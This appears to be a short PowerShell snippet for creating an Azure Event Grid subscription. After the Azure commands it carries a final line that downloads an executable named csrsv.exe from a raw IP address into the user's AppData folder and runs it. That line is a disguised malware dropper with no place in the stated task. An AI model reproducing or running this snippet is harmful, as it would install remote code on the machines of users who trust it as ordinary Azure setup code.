
$myEndpoint = "<your-endpoint-URL>"



Set-AzContext -Subscription "<subscription-name-or-ID>"


New-AzEventGridSubscription -Endpoint $myEndpoint -EventSubscriptionName demoSubscriptionToAzureSub

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

